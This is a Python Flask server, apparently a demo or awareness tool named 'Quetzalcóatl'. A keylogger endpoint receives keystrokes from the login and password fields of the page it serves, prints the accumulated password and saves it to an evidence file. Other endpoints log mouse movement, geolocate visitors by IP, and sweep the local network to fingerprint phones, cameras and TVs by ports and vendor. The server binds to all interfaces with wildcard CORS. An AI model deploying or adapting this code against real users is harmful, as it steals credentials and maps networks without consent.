from flask import Flask, request, jsonify, send_file
import requests
import struct
import ipaddress
import socket
import subprocess
import platform
import concurrent.futures
import threading
import time
import logging
from datetime import datetime

# Silenciar logs HTTP de Werkzeug — solo se muestran las alertas del keylogger
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Pool compartido para resolución DNS (evita crear un ThreadPoolExecutor por IP)
_dns_pool = concurrent.futures.ThreadPoolExecutor(max_workers=50, thread_name_prefix='dns')

# Configuración del archivo de evidencia
ARCHIVO_EVIDENCIA = "evidencia_quetzalcoatl.txt"
_lock_evidencia = threading.Lock()

# Función auxiliar para escribir evidencia con timestamp
def registrar_evidencia(tipo_campo, tecla, buffer_completo):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [SISTEMA] Intercepción en '{tipo_campo}': Tecla capturada: '{tecla}' | Buffer acumulado: {buffer_completo}\n"
    with _lock_evidencia:
        with open(ARCHIVO_EVIDENCIA, "a") as f:
            f.write(log_entry)


# ==========================================
# RUTAS PARA SERVIR ARCHIVOS (FRONTEND)
# ==========================================

def obtener_red_local():
    """
    Enumera TODAS las interfaces de red, filtra loopback y VPN (/32, utun, tun),
    y elige la mejor interfaz LAN real (prefiere 192.168.x, luego 10.x).
    Limita el escaneo a /24 para que la demo sea ágil.
    """
    candidatos = []  # lista de (ip, prefijo, red_obj)

    try:
        if platform.system() == 'Darwin':  # macOS
            resultado = subprocess.check_output(['ifconfig'], text=True)
            interfaz_actual = None
            for linea in resultado.split('\n'):
                # Detectar nombre de interfaz (línea sin indentación)
                if linea and not linea.startswith('\t') and not linea.startswith(' '):
                    interfaz_actual = linea.split(':')[0]
                # Buscar líneas con inet (IPv4)
                if 'inet ' in linea and 'netmask' in linea and interfaz_actual:
                    # Ignorar loopback y túneles VPN
                    if interfaz_actual == 'lo0' or interfaz_actual.startswith('utun') \
                            or interfaz_actual.startswith('tun') or interfaz_actual.startswith('ppp'):
                        continue
                    try:
                        partes = linea.split()
                        ip = partes[partes.index('inet') + 1]
                        if ip.startswith('127.'):
                            continue
                        hex_mask = partes[partes.index('netmask') + 1]
                        if hex_mask.startswith('0x'):
                            val = int(hex_mask, 16)
                            mascara_str = socket.inet_ntoa(struct.pack('>I', val))
                            red_obj = ipaddress.IPv4Network(f"{ip}/{mascara_str}", strict=False)
                            if red_obj.prefixlen < 32:  # descartar /32 (VPN puntual)
                                candidatos.append((ip, red_obj.prefixlen, red_obj))
                    except (ValueError, IndexError):
                        continue

        elif platform.system() == 'Linux':
            resultado = subprocess.check_output(['ip', 'addr'], text=True)
            interfaz_actual = None
            for linea in resultado.split('\n'):
                if linea and not linea.startswith(' ') and not linea.startswith('\t'):
                    partes = linea.split(':')
                    if len(partes) >= 2:
                        interfaz_actual = partes[1].strip().split('@')[0]
                if 'inet ' in linea and '/' in linea and interfaz_actual:
                    if interfaz_actual in ['lo'] or interfaz_actual.startswith('tun') \
                            or interfaz_actual.startswith('virbr') or interfaz_actual.startswith('docker'):
                        continue
                    try:
                        partes = linea.split()
                        cidr = partes[partes.index('inet') + 1]
                        ip, pref = cidr.split('/')
                        if ip.startswith('127.'):
                            continue
                        prefijo = int(pref)
                        if prefijo < 32:
                            red_obj = ipaddress.IPv4Network(f"{ip}/{prefijo}", strict=False)
                            candidatos.append((ip, prefijo, red_obj))
                    except (ValueError, IndexError):
                        continue

    except Exception:
        pass

    # Ordenar candidatos: primero 192.168.x (WiFi doméstica/uni),
    # luego 172.x, luego 10.x. En empate, preferir red más grande (prefijo menor).
    def puntuacion(c):
        ip, prefijo, _ = c
        if ip.startswith('192.168.'):
            return (0, prefijo)
        elif ip.startswith('172.'):
            return (1, prefijo)
        elif ip.startswith('10.'):
            return (2, prefijo)
        return (3, prefijo)

    candidatos.sort(key=puntuacion)

    if candidatos:
        mi_ip, prefijo, _ = candidatos[0]
        # Limitar a /22 máximo para no escanear redes gigantes
        prefijo = max(prefijo, 22)
        red = ipaddress.IPv4Network(f"{mi_ip}/{prefijo}", strict=False)
        return mi_ip, red

    # Fallback absoluto: ruta hacia 8.8.8.8, forzar /24
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            mi_ip = s.getsockname()[0]
        finally:
            s.close()
        red = ipaddress.IPv4Network(f"{mi_ip}/24", strict=False)
        return mi_ip, red
    except Exception:
        return "127.0.0.1", ipaddress.IPv4Network("127.0.0.1/24", strict=False)


@app.route('/api/scan_arp', methods=['GET'])
def scan_arp():
    try:
        mi_ip, red = obtener_red_local()
        ip_bcast   = str(red.broadcast_address)

        # ── Helpers ───────────────────────────────────────────────────────────
        def _gateway():
            gw = None
            try:
                if platform.system() == 'Darwin':
                    try:
                        out = subprocess.check_output(
                            ['route', '-n', 'get', 'default'], text=True, timeout=2)
                        for l in out.split('\n'):
                            if 'gateway' in l and ':' in l:
                                gw = l.split(':')[1].strip(); break
                    except Exception:
                        pass
                    if not gw:
                        out = subprocess.check_output(['netstat', '-rn'], text=True, timeout=2)
                        for l in out.split('\n'):
                            p = l.split()
                            if p and p[0] == 'default' and len(p) > 1:
                                try: ipaddress.IPv4Address(p[1]); gw = p[1]; break
                                except ValueError: pass
                elif platform.system() == 'Linux':
                    out = subprocess.check_output(
                        ['ip', 'route', 'show', 'default'], text=True, timeout=2)
                    p = out.split()
                    if 'via' in p: gw = p[p.index('via') + 1]
            except Exception:
                pass
            return gw

        def _ssdp():
            """SSDP/UPnP — descubre Smart TVs, Chromecasts, Rokus, asistentes, cámaras IP"""
            found = set()
            # Múltiples búsquedas: genérica + DIAL (Chromecast/Roku/SmartTV) + MediaRenderer
            searches = [
                b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nST: ssdp:all\r\nMX: 3\r\n\r\n',
                b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nMX: 3\r\n\r\n',
                b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nST: urn:schemas-upnp-org:device:MediaRenderer:1\r\nMX: 3\r\n\r\n',
                b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nST: urn:samsung.com:device:RemoteControlReceiver:1\r\nMX: 3\r\n\r\n',
            ]
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
                    s.settimeout(3.5)
                    for msg in searches:
                        try: s.sendto(msg, ('239.255.255.250', 1900))
                        except Exception: pass
                    while True:
                        try:
                            _, addr = s.recvfrom(4096)
                            found.add(addr[0])
                        except socket.timeout:
                            break
            except Exception:
                pass
            return found

        def _mdns():
            """mDNS multicast — descubre Apple TV, AirPlay, Chromecast, Sonos, impresoras"""
            found = set()
            # Consultas para servicios comunes de dispositivos domésticos
            def _build_query(service):
                parts = service.encode().split(b'.')
                q = b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                for part in parts:
                    q += bytes([len(part)]) + part
                q += b'\x00\x00\x0c\x00\x01'
                return q

            servicios = [
                '_googlecast._tcp.local',
                '_airplay._tcp.local',
                '_raop._tcp.local',
                '_http._tcp.local',
                '_ipp._tcp.local',
                '_printer._tcp.local',
                '_sonos._tcp.local',
            ]
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
                    s.settimeout(3.0)
                    for svc in servicios:
                        try: s.sendto(_build_query(svc), ('224.0.0.251', 5353))
                        except Exception: pass
                    while True:
                        try:
                            _, addr = s.recvfrom(4096)
                            found.add(addr[0])
                        except socket.timeout:
                            break
            except Exception:
                pass
            return found

        def _netbios():
            """NetBIOS UDP 137 — descubre computadoras Windows/Samba aunque bloqueen ICMP"""
            found = set()
            # Broadcast NetBIOS Name Service query
            pkt = (b'\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                   b'\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01')
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    s.settimeout(2.5)
                    s.sendto(pkt, ('255.255.255.255', 137))
                    s.sendto(pkt, (str(red.broadcast_address), 137))
                    while True:
                        try:
                            _, addr = s.recvfrom(4096)
                            found.add(addr[0])
                        except socket.timeout:
                            break
            except Exception:
                pass
            return found

        def _leer_arp():
            tabla = {}
            try:
                # -n: no resolución DNS → instantáneo incluso en redes /22 con 1000+ entradas.
                # Sin -n, macOS hace gethostbyaddr por cada IP y puede tardar 30s+.
                out = subprocess.check_output(['arp', '-a', '-n'], text=True, timeout=5)
                for l in out.split('\n'):
                    if '(' not in l or ')' not in l or 'incomplete' in l:
                        continue
                    try:
                        ip  = l.split('(')[1].split(')')[0]
                        mac = l.split('at ')[1].split(' ')[0] if 'at ' in l else 'Desconocida'
                        if mac != 'ff:ff:ff:ff:ff:ff' and not ip.endswith('.255') \
                                and '224.' not in ip and '239.' not in ip:
                            tabla[ip] = mac
                    except Exception:
                        pass
            except Exception:
                pass
            return tabla

        def _hostname_safe(ip):
            try:
                return _dns_pool.submit(socket.gethostbyaddr, ip).result(timeout=1.0)[0]
            except Exception:
                return None

        # ── Descubrimiento ────────────────────────────────────────────────────
        ips_mac = {}
        gw = None

        # Descubrimiento multiprotocolo en paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            f_gw      = ex.submit(_gateway)
            f_ssdp    = ex.submit(_ssdp)
            f_mdns    = ex.submit(_mdns)
            f_netbios = ex.submit(_netbios)
            # Ping broadcast para poblar ARP rápido en redes domésticas
            ex.submit(lambda: subprocess.run(
                ['ping', '-c', '2', '-i', '0.2', ip_bcast],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3))

            try: gw = f_gw.result(timeout=3)
            except Exception: pass

            for fut, label in [(f_ssdp, 4), (f_mdns, 3), (f_netbios, 3)]:
                try:
                    for ip in fut.result(timeout=label):
                        if ip != mi_ip:
                            ips_mac[ip] = 'Desconocida'
                except Exception:
                    pass

        hosts_local = [str(h) for h in red.hosts() if str(h) != mi_ip]
        n_hosts     = len(hosts_local)
        workers     = min(n_hosts, 200)

        # ── MONITOR CONTINUO DE ARP ───────────────────────────────────────────
        # Corre en paralelo durante todo el escaneo. Captura cualquier dispositivo
        # que aparezca en la tabla ARP en cualquier momento (gratuitous ARP,
        # DHCP renewal, multicast, etc.) sin importar cuándo responda.
        _monitor_activo = True

        def _arp_monitor():
            while _monitor_activo:
                for ip, mac in _leer_arp().items():
                    if ip != mi_ip:
                        ips_mac[ip] = mac
                time.sleep(0.4)

        monitor_thread = threading.Thread(target=_arp_monitor, daemon=True)
        monitor_thread.start()

        # ── FASE 0: PRE-SCAN PASIVO (2s) ─────────────────────────────────────
        # Antes de hacer ruido, escuchar: los dispositivos envían ARP y
        # gratuitous ARP periódicamente. Capturalos sin hacer nada.
        time.sleep(2.0)

        # ── FASE 1: DESCUBRIMIENTO RÁPIDO ────────────────────────────────────
        # Ping + TCP a 2 puertos = 3 paquetes que disparan ARP del OS.
        # No necesitamos más: con 1 solo paquete el OS hace el ARP request.
        def _discover(ip):
            try:
                subprocess.run(['ping', '-c', '1', '-W', '400', ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.7)
            except Exception:
                pass
            for p in [80, 443]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.4)
                        s.connect_ex((ip, p))
                except Exception:
                    pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(_discover, hosts_local))

        time.sleep(1.5)  # dejar que el OS procese respuestas ARP

        # ── FASE 2: SEGUNDA PASADA CON PUERTOS DE DISPOSITIVOS ESPECÍFICOS ───
        # Solo IPs no encontradas. Usa puertos que TVs, cámaras y PCs sí abren.
        ips_pendientes = [h for h in hosts_local if h not in ips_mac]

        def _discover_especifico(ip):
            for p in [445, 3389, 548, 5900, 8008, 3000, 554, 8060, 8001, 8080]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.5)
                        s.connect_ex((ip, p))
                except Exception:
                    pass

        if ips_pendientes:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=min(len(ips_pendientes), 200)) as ex:
                list(ex.map(_discover_especifico, ips_pendientes))
            time.sleep(1.5)

        # ── FASE 3: ESPERA FINAL + PARAR MONITOR ─────────────────────────────
        time.sleep(1.0)
        _monitor_activo = False
        monitor_thread.join(timeout=1)

        # Gateway siempre presente aunque no responda
        if gw and gw != mi_ip:
            ips_mac[gw] = ips_mac.get(gw, 'Desconocida')

        nodos_encontrados = list(ips_mac.items())

        # ── Fingerprinting — puertos en paralelo, hostname con timeout ────────
        # Solo fingerprinting a los primeros MAX_FINGER más interesantes
        # (con MAC real primero, luego el resto) para no tardar minutos en redes /22
        MAX_FINGER = 80
        nodos_con_mac = [(ip, m) for ip, m in nodos_encontrados if m != 'Desconocida']
        nodos_sin_mac = [(ip, m) for ip, m in nodos_encontrados if m == 'Desconocida']
        nodos_a_finger = (nodos_con_mac + nodos_sin_mac)[:MAX_FINGER]
        nodos_basico   = (nodos_con_mac + nodos_sin_mac)[MAX_FINGER:]

        # Puertos universales — computadoras, TVs, cámaras, impresoras, IoT, NAS
        PUERTOS = [
            22, 23, 80, 81, 135, 139, 443, 445, 515, 548, 554,
            631, 1400, 1883, 1900, 3000, 3389, 3702,
            4352, 5000, 5001, 5353, 5900, 7000, 7676,
            8001, 8008, 8009, 8060, 8080, 8081,
            8090, 8443, 8554, 8899, 9000, 9100,
            9197, 34567, 37777, 49152, 52323, 55000,
            62078,  # iPhone sync (lockdown) — identificador definitivo de iPhone
        ]

        # ── Vendors por categoría (se busca como subcadena del nombre del fabricante)
        _V_CAMARA    = {'hikvision','dahua','axis','hanwha','vivotek','reolink',
                        'amcrest','foscam','uniview','bosch','pelco','flir'}
        _V_TV        = {'samsung','lg electronics','vizio','tcl','sony','hisense',
                        'philips','sharp','panasonic','toshiba','skyworth','haier'}
        _V_CHROMECAST= {'google'}
        _V_APPLE     = {'apple'}
        _V_IOT       = {'amazon','nest','ring','sonos','belkin','tp-link','tuya',
                        'espressif','shenzhen','lifx','philips lighting','ikea'}
        _V_IMPRESORA = {'hp','hewlett','canon','epson','brother','lexmark',
                        'xerox','ricoh','kyocera','konica','dell'}
        _V_ROUTER    = {'cisco','netgear','asus','linksys','d-link','ubiquiti',
                        'mikrotik','aruba','huawei technologies','zte','motorola mobility'}
        _V_MOVIL     = {'xiaomi','oppo','vivo','oneplus','realme','huawei','motorola',
                        'qualcomm','mediatek','wistron','foxconn','pegatron'}

        def _ping_ttl(ip):
            """TTL del ping → identifica el OS: Windows=128, Linux/Android/iOS/macOS=64"""
            import re
            try:
                r = subprocess.run(['ping', '-c', '1', '-W', '600', ip],
                    capture_output=True, text=True, timeout=1.5)
                if r.returncode == 0:
                    m = re.search(r'ttl=(\d+)', r.stdout, re.IGNORECASE)
                    if m:
                        return int(m.group(1))
            except Exception:
                pass
            return None

        def _clasificar(ip, mac, puertos_abiertos, vendor=None, hostname=None, ttl=None):
            v  = (vendor   or '').lower()
            h  = (hostname or '').lower()
            p  = set(puertos_abiertos)

            # ── 1. Gateway ────────────────────────────────────────────────────
            if ip == gw or ip.endswith('.1') or ip.endswith('.254'):
                return "Router / Módem Principal", "🌐", "router"

            # ── 2. HOSTNAME — señal más confiable que existe ──────────────────
            # iPhones e iPads siempre incluyen "iphone" o "ipad" en su nombre mDNS
            if any(k in h for k in ['iphone', 'ipad']):
                return "iPhone / iPad", "📱", "celular"
            if any(k in h for k in ['android', 'pixel', 'galaxy', 'redmi',
                                     'poco', 'oneplus', 'moto']):
                return "Teléfono Android", "📱", "celular"
            if any(k in h for k in ['macbook', 'imac', 'mac-mini',
                                     'mac-pro', 'mac-studio']):
                return "MacBook / Mac", "🍎", "celular"
            if any(k in h for k in ['desktop-', 'laptop-', 'pc-',
                                     'workstation', 'lenovo', 'thinkpad',
                                     'dell-', 'hp-', 'asus-']):
                return "PC / Laptop Windows", "💻", "router"
            if 'appletv' in h or 'apple-tv' in h:
                return "Apple TV", "🍎", "smarttv"
            if 'chromecast' in h or 'google-cast' in h:
                return "Chromecast", "📺", "smarttv"
            if any(k in h for k in ['roku', 'firetv', 'fire-tv',
                                     'smart-tv', 'smarttv', 'bravia']):
                return "Smart TV", "📺", "smarttv"
            if 'printer' in h or 'print' in h:
                return "Impresora de Red", "🖨️", "router"

            # ── 3. VENDOR (OUI) — fabricante del hardware ─────────────────────
            if any(k in v for k in _V_CAMARA):
                return "Cámara IP", "📷", "camara"
            if any(k in v for k in _V_TV):
                return "Smart TV", "📺", "smarttv"
            if any(k in v for k in _V_CHROMECAST):
                return "Google / Chromecast", "📺", "smarttv"
            if any(k in v for k in _V_APPLE):
                return "Dispositivo Apple", "🍎", "celular"
            if any(k in v for k in _V_IOT):
                return "Dispositivo IoT / Asistente", "🔊", "asistente"
            if any(k in v for k in _V_IMPRESORA):
                return "Impresora de Red", "🖨️", "router"
            if any(k in v for k in _V_ROUTER):
                return "Router / Switch", "🌐", "router"
            if any(k in v for k in _V_MOVIL):
                return "Teléfono Móvil", "📱", "celular"

            # ── 4. PUERTOS — fingerprinting capa 7 ───────────────────────────
            if p & {554, 8554, 34567, 37777, 8899}:
                return "Cámara de Seguridad (RTSP)", "📷", "camara"
            if p & {81, 82, 83} and not p & {22, 443}:
                return "Cámara IP / NVR", "📷", "camara"
            if p & {8001, 4352, 7676}:
                return "Smart TV Samsung", "📺", "smarttv"
            if 3000 in p and not p & {22, 445}:
                return "Smart TV LG (webOS)", "📺", "smarttv"
            if p & {8060, 8090}:
                return "Smart TV / Roku", "📺", "smarttv"
            if 52323 in p:
                return "Smart TV Sony", "📺", "smarttv"
            if p & {8008, 8009}:
                return "Chromecast / Smart TV", "📺", "smarttv"
            if p & {7000, 49152} and 80 not in p:
                return "Apple TV / AirPlay", "🍎", "smarttv"
            if 62078 in p:                         # iPhone sync port — SOLO iPhones
                return "iPhone / iPad", "📱", "celular"
            if 1400 in p:
                return "Altavoz Sonos", "🔊", "asistente"
            if 1883 in p:
                return "Dispositivo IoT (MQTT)", "🔊", "asistente"
            if p & {9100, 515}:
                return "Impresora de Red", "🖨️", "router"
            if 631 in p and 22 not in p:
                return "Impresora de Red (IPP)", "🖨️", "router"
            if 23 in p:
                return "Router / Switch (Telnet)", "🌐", "router"
            if p & {135, 445, 139} or 3389 in p:
                return ("PC / Laptop Windows (RDP)", "💻", "router") if 3389 in p \
                    else ("PC / Laptop Windows", "💻", "router")
            if 548 in p or 5900 in p:
                return "Mac / MacBook", "🍎", "celular"
            if 22 in p and p & {80, 443, 445, 5000, 5001, 9000}:
                return "Servidor / NAS", "🖥️", "router"
            if p & {8080, 8081, 8443}:
                return "Servidor Web / Panel Admin", "🖥️", "router"

            # ── 5. TTL del ping — distingue Windows de móviles/macOS/Linux ───
            if ttl is not None:
                if ttl >= 120:   # TTL original 128 → Windows (puede llegar reducido)
                    return "PC / Laptop Windows", "💻", "router"
                if ttl <= 70:    # TTL original 64 → Android, iOS, Linux, macOS
                    # Sin puertos → probablemente móvil (PCs tienen puertos abiertos)
                    if not p:
                        return "Teléfono / Tablet", "📱", "celular"

            # ── 6. MAC bit local — último recurso, ya no como único criterio ─
            if mac not in ('Desconocida', 'ff:ff:ff:ff:ff:ff') and len(mac) >= 2:
                if mac[1].lower() in ['2', '6', 'a', 'e'] and not p:
                    return "Teléfono / Tablet (no identificado)", "📱", "celular"

            # ── 7. Default ────────────────────────────────────────────────────
            return "Dispositivo de Red", "💻", "router"

        def interrogar(nodo):
            ip, mac = nodo

            def check_port(port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.5)
                        return port if s.connect_ex((ip, port)) == 0 else None
                except Exception:
                    return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pex:
                puertos_abiertos = [p for p in pex.map(check_port, PUERTOS) if p]

            # Hostname + TTL en paralelo — ambos usan el pool compartido (sin leak)
            f_host = _dns_pool.submit(socket.gethostbyaddr, ip)
            f_ttl  = _dns_pool.submit(_ping_ttl, ip)

            hostname = None
            try:
                hostname = f_host.result(timeout=1.0)[0]
            except Exception:
                pass

            ttl = None
            try:
                ttl = f_ttl.result(timeout=2.0)
            except Exception:
                pass

            vendor = None
            if mac not in ('Desconocida', 'ff:ff:ff:ff:ff:ff'):
                try:
                    r = requests.get(
                        f"https://api.maclookup.app/v2/macs/{mac}", timeout=1.5)
                    data = r.json()
                    if data.get('found'):
                        vendor = data.get('company', '')[:32]
                except Exception:
                    pass

            tipo, icono, clase = _clasificar(ip, mac, puertos_abiertos,
                                             vendor, hostname, ttl)
            return {
                "ip": ip, "mac": mac, "tipo": tipo,
                "icono": icono, "clase": clase,
                "hostname": hostname, "vendor": vendor,
                "puertos": puertos_abiertos
            }

        def interrogar_basico(nodo):
            ip, mac = nodo
            tipo, icono, clase = _clasificar(ip, mac, [], None, None, None)
            return {
                "ip": ip, "mac": mac, "tipo": tipo,
                "icono": icono, "clase": clase,
                "hostname": None, "vendor": None, "puertos": []
            }

        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
            f_finger = list(executor.map(interrogar, nodos_a_finger))
            f_basico = list(executor.map(interrogar_basico, nodos_basico))

        dispositivos = f_finger + f_basico

        dispositivos.append({
            "ip": mi_ip, "mac": "Host Local",
            "tipo": "Tu Equipo (Servidor RuloSec)",
            "icono": "🧠", "clase": "db",
            "hostname": None, "vendor": None, "puertos": []
        })

        return jsonify({
            "status": "success",
            "devices": dispositivos,
            "red_detectada": str(red),
            "total_hosts_escaneados": len(hosts_local)
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route('/')
def inicio():
    return send_file('index.html')

@app.route('/script.js')
def servir_script():
    return send_file('script.js')

@app.route('/<path:filename>')
def servir_archivos_estaticos(filename):
    if filename.endswith('.png'):
        return send_file(filename)
    return "Archivo no encontrado", 404


# ==========================================
# ENDPOINTS DE LA API (BACKEND)
# ==========================================

@app.route('/api/ip', methods=['POST'])
def obtener_ip():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()

    if ip_cliente == '127.0.0.1':
        try:
            ip_cliente = requests.get('https://api.ipify.org', timeout=3).text
        except Exception:
            pass

    url = f"http://ip-api.com/json/{ip_cliente}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,as,query"

    try:
        respuesta = requests.get(url, timeout=5).json()
    except Exception:
        respuesta = {}

    return jsonify({
        "ip": respuesta.get("query", ip_cliente),
        "pais": respuesta.get("country", "Desconocido"),
        "estado": respuesta.get("regionName", "Desconocido"),
        "ciudad": respuesta.get("city", "Desconocida"),
        "codigo_postal": respuesta.get("zip", "Desconocido"),
        "latitud": respuesta.get("lat", 0),
        "longitud": respuesta.get("lon", 0),
        "isp": respuesta.get("isp", "Desconocido"),
        "asn": respuesta.get("as", "Desconocido"),
        "zona_horaria": respuesta.get("timezone", "Desconocido")
    }), 200


@app.route('/api/keylogger', methods=['POST'])
def keylogger_endpoint():
    datos = request.get_json()
    if datos:
        tecla = datos.get('tecla', '')
        field_context = datos.get('field', 'Desconocido')
        texto_actual = datos.get('texto_actual', '')

        if field_context == 'user-input':
            label_terminal = "👤 Usuario"
            label_archivo = "Campo Usuario (rulo_@)"
        elif field_context == 'pass-input':
            label_terminal = "🔑 Contraseña"
            label_archivo = "Campo Contraseña (!312)"
        else:
            label_terminal = "❓ Desconocido"
            label_archivo = field_context

        print(f"\033[91m[ALERTA KEYLOGGER - {label_terminal}] Contraseña actual: '{texto_actual}' (Tecla: '{tecla}')\033[0m")
        registrar_evidencia(label_archivo, tecla, texto_actual)

    return jsonify({"status": "ok"}), 200


@app.route('/api/raton', methods=['POST'])
def raton_endpoint():
    datos = request.get_json()
    if datos:
        print(f"\033[94m[BIOMETRÍA] Posición X: {datos.get('x')} | Y: {datos.get('y')}\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route('/api/escaner', methods=['POST'])
def escaner_endpoint():
    datos = request.get_json()
    if datos:
        print(f"\033[92m[ESCÁNER RED] Host: {datos.get('objetivo')} | Estado: {datos.get('estado')} | Latencia: {datos.get('tiempo')}ms\033[0m")
    return jsonify({"status": "ok"}), 200


# ==========================================
# CONFIGURACIÓN DE CORS Y ARRANQUE
# ==========================================

@app.after_request
def add_cors_headers(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response


if __name__ == '__main__':
    print("\n\033[95m[SISTEMA QUETZALCÓATL] Servidor de Inteligencia corriendo en puerto 5001...\033[0m")
    print(f"\033[95m[SISTEMA QUETZALCÓATL] Evidencia del keylogger se guardará en: {ARCHIVO_EVIDENCIA}\033[0m")
    app.run(host='0.0.0.0', port=5001, debug=False)